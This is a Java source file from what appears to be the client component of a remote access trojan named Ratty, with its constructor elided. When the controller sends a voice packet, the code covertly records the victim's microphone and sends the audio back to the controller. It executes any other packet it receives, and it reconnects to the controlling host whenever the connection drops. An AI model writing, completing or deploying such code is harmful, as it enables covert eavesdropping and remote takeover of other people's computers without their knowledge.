package de.sogomn.rat;

import de.sogomn.rat.packet.IPacket;
import de.sogomn.rat.packet.VoicePacket;
import de.sogomn.rat.util.VoiceRecorder;

public final class Client implements IConnectionObserver {
	
	private static final int VOICE_BUFFER_SIZE = 1024 << 6;
	
	public Client() {
		//...
	}
	
	private void handleVoiceRequest(final ActiveConnection connection) {
		final VoiceRecorder voiceRecorder = new VoiceRecorder(VOICE_BUFFER_SIZE);
		
		voiceRecorder.setObserver(recorder -> {
			final byte[] data = recorder.getLastRecord();
			final VoicePacket packet = new VoicePacket(data);
			
			recorder.stop();
			connection.addPacket(packet);
		});
		voiceRecorder.start();
	}
	
	@Override
	public void packetReceived(final ActiveConnection connection, final IPacket packet) {
		final Class<? extends IPacket> clazz = packet.getClass();
		
		if (clazz == VoicePacket.class) {
			handleVoiceRequest(connection);
		} else {
			packet.execute(connection);
		}
	}
	
	@Override
	public void disconnected(final ActiveConnection connection) {
		final String address = connection.getAddress();
		final int port = connection.getPort();
		
		connection.setObserver(null);
		
		Ratty.connectToHost(address, port);
	}
	
}
